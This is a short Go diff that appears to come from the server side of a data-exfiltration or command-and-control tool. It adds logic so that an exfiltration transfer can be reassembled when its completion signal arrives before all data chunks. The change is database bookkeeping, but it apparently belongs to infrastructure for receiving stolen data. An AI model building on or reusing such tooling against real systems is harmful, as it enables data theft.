@@ -660,6 +660,21 @@ func (d *MasterDatabase) tryAssembleExfilTransferTx(tx *sql.Tx, sessionID string
 		return false, err
 	}
 
+	// SHADOW MESH: If total is 0, check pending_exfil_completions for the expected total
+	// This handles the case where completion signal arrived before all chunks
+	if total == 0 {
+		var pendingTotal int
+		err := tx.QueryRow(`
+			SELECT total_chunks FROM pending_exfil_completions WHERE session_id = ?
+		`, sessionID).Scan(&pendingTotal)
+		if err == nil && pendingTotal > 0 {
+			total = pendingTotal
+			// Update the transfer with the total from pending
+			tx.Exec(`UPDATE exfil_transfers SET total_chunks = ? WHERE session_id = ? AND total_chunks = 0`,
+				pendingTotal, sessionID)
+		}
+	}
+
 	if total == 0 || received == 0 || received < total {
 		return false, nil
 	}
